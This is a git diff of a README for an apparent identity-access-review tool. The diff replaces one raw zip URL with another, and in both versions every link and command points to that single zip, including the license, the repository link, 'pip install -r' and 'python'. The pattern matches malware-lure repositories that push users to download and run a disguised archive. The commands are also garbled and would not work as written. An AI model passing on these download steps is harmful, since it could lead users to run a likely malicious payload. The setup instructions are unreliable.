@@ -1,6 +1,6 @@
 # 🚀 Identity-Access-Review-System - Manage User Access Effortlessly
 
-[![Download Now](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip%20Now%20-v1.0-brightgreen)](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip)
+[![Download Now](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip%20Now%20-v1.0-brightgreen)](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip)
 
 ## 🎯 Overview
 
@@ -19,23 +19,23 @@ To run the Identity-Access-Review-System, follow these clear steps:
 
 ### 2. 💾 Download the Application
 
-You can find the latest version of the Identity-Access-Review-System on our [Releases page](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip). 
+You can find the latest version of the Identity-Access-Review-System on our [Releases page](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip). 
 
 ### 3. 📥 Download & Install
 
 Follow these steps to download the application:
 
-1. Click on this link to **visit the Releases page**: [Download Here](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip).
+1. Click on this link to **visit the Releases page**: [Download Here](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip).
 2. Look for the latest version listed there.
 3. Click on the appropriate file for your operating system to download it.
 
 ### 4. 📂 Extract the Files (If Needed)
 
-If you download a compressed file (like `.zip` or `https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip`), follow these steps:
+If you download a compressed file (like `.zip` or `https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip`), follow these steps:
 
 - **Windows:** Right-click the file and select "Extract All".
 - **macOS:** Double-click the file to extract it.
-- **Linux:** Open a terminal, navigate to the download directory, and use the command `tar -xzf https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip` or `unzip https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip`.
+- **Linux:** Open a terminal, navigate to the download directory, and use the command `tar -xzf https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip` or `unzip https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip`.
 
 ### 5. 🔧 Install Dependencies
 
@@ -46,10 +46,10 @@ Before you run the application, you must install some necessary Python libraries
 3. Run the following command to install dependencies:
 
 ```bash
-pip install -r https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip
+pip install -r https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip
 ```
 
-This command will look for a file named `https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip` in the folder and install all necessary libraries.
+This command will look for a file named `https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip` in the folder and install all necessary libraries.
 
 ### 6. 🎮 Run the Application
 
@@ -59,7 +59,7 @@ Now that you have everything set up:
 2. Type the following command to start the application:
 
 ```bash
-python https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip
+python https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip
 ```
 
 The application should now run. Follow the on-screen instructions to explore its features.
@@ -99,11 +99,11 @@ For any questions, suggestions, or issues, you can reach out through the Issues 
 
 ## 📑 License
 
-This project is licensed under the MIT License. See the [https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip) file for details.
+This project is licensed under the MIT License. See the [https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip) file for details.
 
 ## 🔗 Links
 
-- [Project Repository](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip)
-- [Download Here](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/governance/__pycache__/Access_System_Review_Identity_v2.9.zip)
+- [Project Repository](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip)
+- [Download Here](https://github.com/adityasisodia88/Identity-Access-Review-System/raw/refs/heads/main/gui/System-Identity-Review-Access-pantheology.zip)
 
 Thank you for using the Identity-Access-Review-System. We hope you find it helpful for managing user access in your organization.
